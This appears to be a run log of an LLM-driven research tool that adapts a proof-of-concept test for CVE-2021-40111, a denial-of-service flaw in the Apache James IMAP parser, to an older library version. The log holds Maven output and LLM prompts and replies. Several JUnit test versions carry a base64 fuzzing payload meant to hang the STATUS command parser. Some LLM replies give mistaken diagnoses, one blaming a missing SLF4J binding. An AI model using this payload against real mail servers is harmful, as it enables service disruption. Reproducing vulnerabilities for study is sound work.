  required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession
  found: org.apache.james.imap.decode.ImapRequestStreamLineReader,org.apache.james.imap.api.ImapCommand,org.apache.james.imap.api.process.ImapSession
  reason: actual and formal argument lists differ in length
[INFO] 1 error
[INFO] -------------------------------------------------------------
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  1.366 s
[INFO] Finished at: 2025-07-13T15:41:05Z
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2021-40111: Compilation failure
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[42,14] method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;
[ERROR]   required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession
[ERROR]   found: org.apache.james.imap.decode.ImapRequestStreamLineReader,org.apache.james.imap.api.ImapCommand,org.apache.james.imap.api.process.ImapSession
[ERROR]   reason: actual and formal argument lists differ in length
[ERROR] 
[ERROR] -> [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException


current_pom file is:<?xml version='1.0' encoding='utf-8'?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <groupId>edu.vision.se</groupId>
    <artifactId>CVE-2021-40111</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <maven.compiler.source>11</maven.compiler.source>
        <maven.compiler.target>11</maven.compiler.target>
    </properties>

    <dependencies>
        
        <dependency>
            <groupId>org.apache.james.protocols</groupId>
            <artifactId>protocols-imap</artifactId>
            <version>3.4.0</version>
        </dependency>
        <dependency>
            <groupId>org.assertj</groupId>
            <artifactId>assertj-core</artifactId>
            <version>3.22.0</version>
        </dependency>
    <dependency><groupId>junit</groupId><artifactId>junit</artifactId><version>4.13.2</version></dependency>
    
    </dependencies>

</project>
[LLMClient] Response: 
test
[96m[Adapter] LLM response for fix position: test[0m
[LLMClient] Tokens used: 242 (prompt), 27 (completion), 269 (total)
[LLMClient] Prompt: 
You are given an error log when executing 'mvn test' in version 3.4.0: 

Error: method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession found: org.apache.james.imap.decode.ImapRequestStreamLineReader,org.apache.james.imap.api.ImapCommand,org.apache.james.imap.api.process.ImapSession reason: actual and formal argument lists differ in length, None, None 

The test executes as expected in 3.5.0 

Error code:         super.decode(request, command, session); 

Extract two key *entities* from the error for searching related diffs 

The extracted entities should reflect code-level identifiers that are likely to appear in source code or diffs. 

Output each node as a `;`-separated list, with no explanations. 


[LLMClient] Response: 
org.apache.james.imap.decode.parser.StatusCommandParser;org.apache.james.imap.decode.ImapRequestStreamLineReader
[96m[ErrorManager] Extracted key entities: ['org.apache.james.imap.decode.parser.StatusCommandParser', 'org.apache.james.imap.decode.ImapRequestStreamLineReader'][0m
[96m[Adapter] Try to solve error: {'file': '/PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java', 'line': 42, 'column': 14, 'message': 'method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession found: org.apache.james.imap.decode.ImapRequestStreamLineReader,org.apache.james.imap.api.ImapCommand,org.apache.james.imap.api.process.ImapSession reason: actual and formal argument lists differ in length', 'symbol': None, 'location': None, 'code_line': '        super.decode(request, command, session);'} with cause: ['org.apache.james.imap.decode.parser.StatusCommandParser', 'org.apache.james.imap.decode.ImapRequestStreamLineReader'][0m
[LLMClient] Tokens used: 286 (prompt), 38 (completion), 324 (total)
[LLMClient] Prompt: 
You are given an error log when executing 'mvn test' in version 3.4.0: 

Error: method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession found: org.apache.james.imap.decode.ImapRequestStreamLineReader,org.apache.james.imap.api.ImapCommand,org.apache.james.imap.api.process.ImapSession reason: actual and formal argument lists differ in length, None, None 

The test executes as expected in 3.5.0 

Error code:         super.decode(request, command, session); 

Extract two key *entities* from the error for searching related diffs 

The extracted entities should reflect code-level identifiers that are likely to appear in source code or diffs. 

Current cause: ['org.apache.james.imap.decode.parser.StatusCommandParser', 'org.apache.james.imap.decode.ImapRequestStreamLineReader'] 

 failed to catch, try simpler or other entities.

Output each node as a `;`-separated list, with no explanations. 


[LLMClient] Response: 
org.apache.james.imap.decode.parser.StatusCommandParser;org.apache.james.imap.decode.ImapRequestStreamLineReader;StatusCommandParser;ImapRequestStreamLineReader
[96m[ErrorManager] Extracted key entities: ['org.apache.james.imap.decode.parser.StatusCommandParser', 'org.apache.james.imap.decode.ImapRequestStreamLineReader', 'StatusCommandParser', 'ImapRequestStreamLineReader'][0m
[96m[Adapter] Related diffs for error: [(4986, 10.0), (5554, 10.0), (5555, 10.0), (5556, 10.0), (5557, 10.0)][0m
[96m[Adapter] Fix position is in test code.[0m
[96m[RepairModule] Start repair for group: method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession found: org.apache.james.imap.decode.ImapRequestStreamLineReader,org.apache.james.imap.api.ImapCommand,org.apache.james.imap.api.process.ImapSession reason: actual and formal argument lists differ in length | cause: ['org.apache.james.imap.decode.parser.StatusCommandParser', 'org.apache.james.imap.decode.ImapRequestStreamLineReader', 'StatusCommandParser', 'ImapRequestStreamLineReader'][0m
[96m[RepairModule] Trying best diff #4986 with score 10.00[0m
[96m[RepairModule] Iteration 0, temperature 1.000: Trying diff #4986 with score 10.00[0m
[LLMClient] Tokens used: 933 (prompt), 503 (completion), 1436 (total)
[LLMClient] Prompt: 
You are given a Java test file with compilation errors in version 3.4.0:org.apache.james.protocols:protocols-imap.
This test file compiles and runs successfully in 3.5.0.

The diff is related to the diff.
Your task has three steps:
 1. Locate the code where the compilation error occurs.
 2. Analyze the diff from 3.5.0 to 3.4.0.
 3. Fix the error in the error position only when diff is helpful. Add import statement when needed according to the diff. 

Only output the modified version of the test file according to the diff. No explanations. If mocking, access fields via reflection if they exist.
### Compilation Errors:
message: method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession found: org.apache.james.imap.decode.ImapRequestStreamLineReader,org.apache.james.imap.api.ImapCommand,org.apache.james.imap.api.process.ImapSession reason: actual and formal argument lists differ in length, symble: None, location: None

### Error Position:
        super.decode(request, command, session);

### Related Diff:
Operation: MODIFIED, File: protocols/imap/src/main/java/org/apache/james/imap/decode/main/ImapRequestStreamHandler.java, Hunk: @@ -26,6 +26,7 @@
 import org.apache.james.imap.api.ImapSessionState;
 import org.apache.james.imap.api.process.ImapProcessor;
 import org.apache.james.imap.api.process.ImapSession;
-import org.apache.james.imap.decode.DecodingException;
 import org.apache.james.imap.decode.ImapDecoder;
 import org.apache.james.imap.decode.ImapRequestLineReader;
 import org.apache.james.imap.decode.ImapRequestStreamLineReader;

### Test File Content:
package edu.vision.se;

import static org.assertj.core.api.Assertions.assertThatThrownBy;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.util.Base64;

import org.apache.james.protocols.imap.DecodingException;
import org.apache.james.imap.decode.ImapRequestStreamLineReader;
import org.apache.james.imap.decode.parser.StatusCommandParser;
import org.apache.james.imap.encode.FakeImapSession;
import org.apache.james.imap.message.response.UnpooledStatusResponseFactory;
import org.junit.Test;
import org.apache.james.imap.api.ImapCommand;
import org.apache.james.imap.api.ImapMessage;
import org.apache.james.imap.api.process.ImapSession;

import java.nio.charset.StandardCharsets;


public class Testcase1 {
    @Test(timeout = 1000)
    public void fuzzingInputShouldNotLeadToOutOfMemoryException() {
        String base64Input = "MiAgKH8MSU4kQiBOJEIgICMAf15Df39/f39/f39/f39/f39/f39/f39/f0NDRTogP19GbT8JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCT0NAAAAAAAAAD0/TkNPAAAAAAhlAAAAAAA=";
        byte[] bytes = Base64.getDecoder().decode(base64Input);


        assertThatThrownBy(() -> new StatusCommandParserChild()
                .decode(new ImapRequestStreamLineReader(new ByteArrayInputStream(bytes),
                        new ByteArrayOutputStream()), ImapCommand.anyStateCommand("AEA"), new FakeImapSession()))
                .isInstanceOf(DecodingException.class);
    }
}

class StatusCommandParserChild extends StatusCommandParser {
    public StatusCommandParserChild() {
        super();
    }

    public void decode(ImapRequestStreamLineReader request, ImapCommand command, ImapSession session) throws DecodingException {
        super.decode(request, command, session);
    }
}



[LLMClient] Response: 
Here's the modified version of the test file according to the diff:

```java
package edu.vision.se;

import static org.assertj.core.api.Assertions.assertThatThrownBy;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.util.Base64;

import org.apache.james.protocols.imap.DecodingException;
import org.apache.james.imap.decode.ImapRequestStreamLineReader;
import org.apache.james.imap.decode.parser.StatusCommandParser;
import org.apache.james.imap.encode.FakeImapSession;
import org.apache.james.imap.message.response.UnpooledStatusResponseFactory;
import org.junit.Test;
import org.apache.james.imap.api.ImapCommand;
import org.apache.james.imap.api.ImapMessage;
import org.apache.james.imap.api.process.ImapSession;
import org.apache.james.imap.decode.ImapRequestLineReader;

import java.nio.charset.StandardCharsets;


public class Testcase1 {
    @Test(timeout = 1000)
    public void fuzzingInputShouldNotLeadToOutOfMemoryException() {
        String base64Input = "MiAgKH8MSU4kQiBOJEIgICMAf15Df39/f39/f39/f39/f39/f39/f39/f0NDRTogP19GbT8JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCT0NAAAAAAAAAD0/TkNPAAAAAAhlAAAAAAA=";
        byte[] bytes = Base64.getDecoder().decode(base64Input);


        assertThatThrownBy(() -> new StatusCommandParserChild()
                .decode(new ImapRequestStreamLineReader(new ByteArrayInputStream(bytes),
                        new ByteArrayOutputStream()), ImapCommand.anyStateCommand("AEA"), new FakeImapSession()))
                .isInstanceOf(DecodingException.class);
    }
}

class StatusCommandParserChild extends StatusCommandParser {
    public StatusCommandParserChild() {
        super();
    }

    public void decode(ImapRequestStreamLineReader request, ImapCommand command, ImapSession session) throws DecodingException {
        super.decode(command, request, "TAG", session);
    }
}
```
[96m[RepairModule] Wrote modified code to /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java[0m
[96m[Executor] Executing exploit for CVE-2021-40111 on version 3.4.0...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.runners.model.TestTimedOutException'[0m
[91m[Executor] Reproduction result: Failure[0m
[RepairModule] Old grouped keys: {'method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession found: org.apache.james.imap.decode.ImapRequestStreamLineReader,org.apache.james.imap.api.ImapCommand,org.apache.james.imap.api.process.ImapSession reason: actual and formal argument lists differ in length |'}
[RepairModule] New grouped keys: set()
[92m[RepairModule] Error method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession found: org.apache.james.imap.decode.ImapRequestStreamLineReader,org.apache.james.imap.api.ImapCommand,org.apache.james.imap.api.process.ImapSession reason: actual and formal argument lists differ in length resolved after applying diff.[0m
[92m[RepairModule] Repair success with diff #4986 at iteration 0![0m
[96m[Adapter] Test code repair attempted.[0m
[96m[Executor] Executing exploit for CVE-2021-40111 on version 3.4.0...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.runners.model.TestTimedOutException'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[Adapter] Locating fix position in error log.[0m
[LLMClient] Tokens used: 1294 (prompt), 110 (completion), 1404 (total)
[LLMClient] Prompt: 
You are given a Java error log when executing 'mvn test' in a project with dependency version 3.4.0:org.apache.james.protocols:protocols-imap.
This test file compiles and runs successfully with version 3.5.0.

Your task is to:
1. Analyze why this issue occurs with the *3.5.0* but not with the *3.4.0 version*.
2. Consider how to resolve the issue **without updating this library**.
3. Determine and output the location in the project that should be modified to fix the problem.

Please return 'pom' if the fix is in the pom.xml file, or 'test' if the fix is in the test code.
Do not return any other text, just 'pom' or 'test'.

The error log is:
[INFO] Scanning for projects...
[INFO] 
[INFO] --------------------< edu.vision.se:CVE-2021-40111 >--------------------
[INFO] Building CVE-2021-40111 1.0-SNAPSHOT
[INFO]   from pom.xml
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-clean-plugin:2.5:clean (default-clean) @ CVE-2021-40111 ---
[INFO] Deleting /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/target
[INFO] 
[INFO] --- maven-resources-plugin:2.6:resources (default-resources) @ CVE-2021-40111 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/main/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:compile (default-compile) @ CVE-2021-40111 ---
[INFO] No sources to compile
[INFO] 
[INFO] --- maven-resources-plugin:2.6:testResources (default-testResources) @ CVE-2021-40111 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:testCompile (default-testCompile) @ CVE-2021-40111 ---
[INFO] Changes detected - recompiling the module!
[WARNING] File encoding has not been set, using platform encoding UTF-8, i.e. build is platform dependent!
[INFO] Compiling 1 source file to /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/target/test-classes
[INFO] 
[INFO] --- maven-surefire-plugin:2.12.4:test (default-test) @ CVE-2021-40111 ---
[INFO] Surefire report directory: /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/target/surefire-reports

-------------------------------------------------------
 T E S T S
-------------------------------------------------------
Running edu.vision.se.Testcase1
Tests run: 1, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.192 sec

Results :

Tests run: 1, Failures: 0, Errors: 0, Skipped: 0

[INFO] ------------------------------------------------------------------------
[INFO] BUILD SUCCESS
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  1.711 s
[INFO] Finished at: 2025-07-13T15:41:55Z
[INFO] ------------------------------------------------------------------------

SLF4J: Failed to load class "org.slf4j.impl.StaticLoggerBinder".
SLF4J: Defaulting to no-operation (NOP) logger implementation
SLF4J: See http://www.slf4j.org/codes.html#StaticLoggerBinder for further details.

current_pom file is:<?xml version='1.0' encoding='utf-8'?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <groupId>edu.vision.se</groupId>
    <artifactId>CVE-2021-40111</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <maven.compiler.source>11</maven.compiler.source>
        <maven.compiler.target>11</maven.compiler.target>
    </properties>

    <dependencies>
        
        <dependency>
            <groupId>org.apache.james.protocols</groupId>
            <artifactId>protocols-imap</artifactId>
            <version>3.4.0</version>
        </dependency>
        <dependency>
            <groupId>org.assertj</groupId>
            <artifactId>assertj-core</artifactId>
            <version>3.22.0</version>
        </dependency>
    <dependency><groupId>junit</groupId><artifactId>junit</artifactId><version>4.13.2</version></dependency>
    
    </dependencies>

</project>
[LLMClient] Response: 
Based on the information provided, the issue appears to be related to SLF4J logging implementation missing in version 3.4.0 (which causes a warning but doesn't fail the tests), while working correctly in 3.5.0. 

To resolve this without updating the library (protocols-imap), we would need to add the SLF4J binding dependency in the pom.xml file. This is a dependency configuration issue rather than a test code issue.

Therefore, the fix should be in the pom.xml file.

pom
[96m[Adapter] LLM response for fix position: Based on the information provided, the issue appears to be related to SLF4J logging implementation missing in version 3.4.0 (which causes a warning but doesn't fail the tests), while working correctly in 3.5.0. 

To resolve this without updating the library (protocols-imap), we would need to add the SLF4J binding dependency in the pom.xml file. This is a dependency configuration issue rather than a test code issue.

Therefore, the fix should be in the pom.xml file.

pom[0m
[96m[Adapter] No errors found in initial adaptation.[0m
[91m[Adapter] Assertion Failure.[0m
[LLMClient] Tokens used: 543 (prompt), 20 (completion), 563 (total)
[LLMClient] Prompt: 
You are given an vulnerability exploit in  3.4.0: 

Code: package edu.vision.se;

import static org.assertj.core.api.Assertions.assertThatThrownBy;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.util.Base64;

import org.apache.james.imap.api.Tag;
import org.apache.james.imap.decode.DecodingException;
import org.apache.james.imap.decode.ImapRequestStreamLineReader;
import org.apache.james.imap.decode.parser.StatusCommandParser;
import org.apache.james.imap.encode.FakeImapSession;
import org.apache.james.imap.message.response.UnpooledStatusResponseFactory;
import org.junit.Test;

import java.nio.charset.StandardCharsets;


public class Testcase1 {
    @Test(timeout = 1000)
    public void fuzzingInputShouldNotLeadToOutOfMemoryException() {
        String base64Input = "MiAgKH8MSU4kQiBOJEIgICMAf15Df39/f39/f39/f39/f39/f39/f39/f0NDRTogP19GbT8JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCT0NAAAAAAAAAD0/TkNPAAAAAAhlAAAAAAA=";
        byte[] bytes = Base64.getDecoder().decode(base64Input);


        assertThatThrownBy(() -> new StatusCommandParserChild(new UnpooledStatusResponseFactory())
                .decode(new ImapRequestStreamLineReader(new ByteArrayInputStream(bytes),
                        new ByteArrayOutputStream()), new Tag("AEA"), new FakeImapSession()))
                .isInstanceOf(DecodingException.class);
    }
}

class StatusCommandParserChild extends StatusCommandParser {
    public StatusCommandParserChild(UnpooledStatusResponseFactory statusResponseFactory) {
        super(statusResponseFactory);
    }

    public void decode(ImapRequestStreamLineReader request, Tag tag, FakeImapSession session) throws DecodingException {
        super.decode(request, tag, session);
    }
} 

Extract Call Graph of the API call in library org.apache.james.protocols:protocols-imap(at most 5) 

We use this information to collect diff files 

Output each API name as a `;`-separated list, with no explanations. Withour package name, parameter list. 


[LLMClient] Response: 
StatusCommandParser;decode;ImapRequestStreamLineReader;Tag;FakeImapSession
[96m[ErrorManager] Extracted key entities: ['StatusCommandParser', 'decode', 'ImapRequestStreamLineReader', 'Tag', 'FakeImapSession'][0m
Cause: ['StatusCommandParser', 'decode', 'ImapRequestStreamLineReader', 'Tag', 'FakeImapSession']
Related Diffs: [(5561, 16.0), (5052, 12.0), (5557, 12.0), (5562, 12.0), (5564, 12.0)]
[96m[RepairModule] Start repair[0m
[96m[RepairModule] Start repair[0m
[96m[RepairModule] Start repair[0m
[96m[RepairModule] Start repair[0m
[LLMClient] Tokens used: 681 (prompt), 514 (completion), 1195 (total)
[LLMClient] Prompt: 
You are given an assertion unmatch when executing test in in 3.4.0:org.apache.james.protocols:protocols-imap
This test file reproduced successfully in 3.5.0. with an org.junit.runners.model.TestTimedOutException

The reproduction beahavior is org.junit.runners.model.TestTimedOutException {'test timed out'}.
However, in 3.4.0, the test passed, which is not expected.
Your task is to solve the problem and reproduced the expected behavior in 3.4.0. Your are not to change assertion logic.
Current test file is package edu.vision.se;

import static org.assertj.core.api.Assertions.assertThatThrownBy;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.util.Base64;

import org.apache.james.protocols.imap.DecodingException;
import org.apache.james.imap.decode.ImapRequestStreamLineReader;
import org.apache.james.imap.decode.parser.StatusCommandParser;
import org.apache.james.imap.encode.FakeImapSession;
import org.apache.james.imap.message.response.UnpooledStatusResponseFactory;
import org.junit.Test;
import org.apache.james.imap.api.ImapCommand;
import org.apache.james.imap.api.ImapMessage;
import org.apache.james.imap.api.process.ImapSession;
import org.apache.james.imap.decode.ImapRequestLineReader;

import java.nio.charset.StandardCharsets;


public class Testcase1 {
    @Test(timeout = 1000)
    public void fuzzingInputShouldNotLeadToOutOfMemoryException() {
        String base64Input = "MiAgKH8MSU4kQiBOJEIgICMAf15Df39/f39/f39/f39/f39/f39/f39/f0NDRTogP19GbT8JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCT0NAAAAAAAAAD0/TkNPAAAAAAhlAAAAAAA=";
        byte[] bytes = Base64.getDecoder().decode(base64Input);


        assertThatThrownBy(() -> new StatusCommandParserChild()
                .decode(new ImapRequestStreamLineReader(new ByteArrayInputStream(bytes),
                        new ByteArrayOutputStream()), ImapCommand.anyStateCommand("AEA"), new FakeImapSession()))
                .isInstanceOf(DecodingException.class);
    }
}

class StatusCommandParserChild extends StatusCommandParser {
    public StatusCommandParserChild() {
        super();
    }

    public void decode(ImapRequestStreamLineReader request, ImapCommand command, ImapSession session) throws DecodingException {
        super.decode(command, request, "TAG", session);
    }
}

Your task is 1. Analyze the cause of the errors 2. Decide fix position of the test 3. Output only the updated test without explanation

If you want to open an attact target server, you can open it in @BeforeClass
[LLMClient] Response: 
Based on the analysis, here's the updated test file that should reproduce the expected behavior in 3.4.0:

```java
package edu.vision.se;

import static org.assertj.core.api.Assertions.assertThatThrownBy;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.util.Base64;

import org.apache.james.protocols.imap.DecodingException;
import org.apache.james.imap.decode.ImapRequestStreamLineReader;
import org.apache.james.imap.decode.parser.StatusCommandParser;
import org.apache.james.imap.encode.FakeImapSession;
import org.apache.james.imap.message.response.UnpooledStatusResponseFactory;
import org.junit.Test;
import org.apache.james.imap.api.ImapCommand;
import org.apache.james.imap.api.ImapMessage;
import org.apache.james.imap.api.process.ImapSession;
import org.apache.james.imap.decode.ImapRequestLineReader;

import java.nio.charset.StandardCharsets;


public class Testcase1 {
    @Test(timeout = 10000)
    public void fuzzingInputShouldNotLeadToOutOfMemoryException() {
        String base64Input = "MiAgKH8MSU4kQiBOJEIgICMAf15Df39/f39/f39/f39/f39/f39/f39/f0NDRTogP19GbT8JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCT0NAAAAAAAAAD0/TkNPAAAAAAhlAAAAAAA=";
        byte[] bytes = Base64.getDecoder().decode(base64Input);


        assertThatThrownBy(() -> new StatusCommandParserChild()
                .decode(new ImapRequestStreamLineReader(new ByteArrayInputStream(bytes),
                        new ByteArrayOutputStream()), ImapCommand.anyStateCommand("AEA"), new FakeImapSession()))
                .isInstanceOf(DecodingException.class);
    }
}

class StatusCommandParserChild extends StatusCommandParser {
    public StatusCommandParserChild() {
        super();
    }

    public void decode(ImapRequestStreamLineReader request, ImapCommand command, ImapSession session) throws DecodingException {
        super.decode(command, request, "TAG", session);
    }
}
```
[96m[RepairModule] Wrote modified code to /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java[0m
[96m[Executor] Executing exploit for CVE-2021-40111 on version 3.4.0...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.runners.model.TestTimedOutException'[0m
[91m[Executor] Reproduction result: Failure[0m
[93m[RepairModule] Repair failed, retrying 1/3[0m
[Adapt] â° Timeout: exceeded 300 seconds for 3.5.0 â†’ 3.4.0
[91m[Adapter] Adaptation failed for 3.4.0[0m

[Executor] â–¶ Summary of return codes:
  - Version 3.4.0: âœ— Failed (exit code 1)
